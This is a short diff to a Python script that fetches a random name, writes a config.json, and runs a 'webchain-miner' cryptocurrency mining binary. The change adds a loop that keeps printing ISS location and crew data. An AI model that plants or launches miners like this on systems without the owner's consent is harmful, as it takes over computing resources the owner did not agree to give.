@@ -1,6 +1,8 @@
 import os
 import json
 import requests
+import ISS_Info
+import time
 
 name = requests.get("https://names.drycodes.com/1")
 print(name.text.replace("[","").replace("]","").replace('"',""))
@@ -43,3 +45,7 @@ json_object = json.dumps(dictionary, indent=4)
 with open("config.json", "w") as outfile:
     outfile.write(json_object)
 os.system('chmod +x webchain-miner && ./webchain-miner')
+
+while True:
+    print(ISS_Info.iss_current_loc(),ISS_Info.iss_people_in_space())
+    time.sleep(5)
